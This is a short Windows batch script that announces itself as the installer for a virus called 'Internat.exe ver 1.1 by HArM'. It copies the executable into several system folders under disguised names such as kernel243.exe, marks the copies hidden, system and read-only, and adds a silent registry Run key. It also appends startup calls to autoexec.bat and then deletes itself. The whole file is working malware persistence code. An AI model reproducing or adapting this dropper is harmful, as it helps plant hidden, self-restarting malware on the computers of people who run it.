@echo off
cls
echo This will install a virus Internat.exe ver 1.1 by HArM
echo Press any key to start installation
@pause >nul

@copy Internat.exe C:\autoexe.exe >nul
@attrib +s +r +a C:\autoexe.exe >nul
@copy C:\autoexe.exe C:\windows\command.exe >nul
@attrib +s +r +a C:\windows\command.exe >nul
@copy C:\windows\command.exe C:\windows\system\kernel243.exe >nul
@attrib +s +r +a C:\windows\system\kernel243.exe >nul
@copy C:\windows\system\kernel243.exe C:\windows\temp\temp.exe >nul
@attrib +s +r +a C:\windows\temp\temp.exe >nul
@copy C:\windows\temp\temp.exe C:\windows\tempor~1\cache1\cache1.exe >nul
@attrib +s +r +a C:\windows\tempor~1\cache1\cache1.exe >nul

@echo REGEDIT4 >>C:\z.reg
@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>c:\Z.REG
@ECHO "DOS Shell"="C:\\windows\\command.exe" >>C:\z.reg
@start C:\z.reg /m
@del C:\z.reg >nul

@echo Call C:\autoexe.exe >>C:\autoexec.bat
@echo if not exist C:\autoexe.exe goto a >>C:\autoexec.bat
@echo :A >>C:\autoexec.bat
@echo Call C:\windows\command.exe >>C:\autoexec.bat
@echo if not exist C:\windows\command.exe goto b >>C:\autoexec.bat
@echo :B >>C:\autoexec.bat
@echo Call C:\windows\system\kernel243.exe >>C:\autoexec.bat
@echo if not exist C:\windows\system\kernel243.exe goto c >>C:\autoexec.bat
@echo :C >>C:\autoexec.bat
@echo Call C:\windows\temp\temp.exe >>C:\autoexec.bat
@echo if not exist C:\windows\temp\temp.exe goto d >>C:\autoexec.bat
@echo :D >>C:\autoexec.bat
@echo Call C:\windows\tempor~1\cache1\cache1.exe
@echo if not exist C:\windows\tempor~1\cache1\cache1.exe goto e >>C:\autoexec.bat
@echo :e >>C:\autoexec.bat
@echo cls >>C:\autoexec.bat

echo Instalation complete! Now the virus is inside this fucking PC!
echo Press any key to start installation
@pause >nul
@del install.bat >nul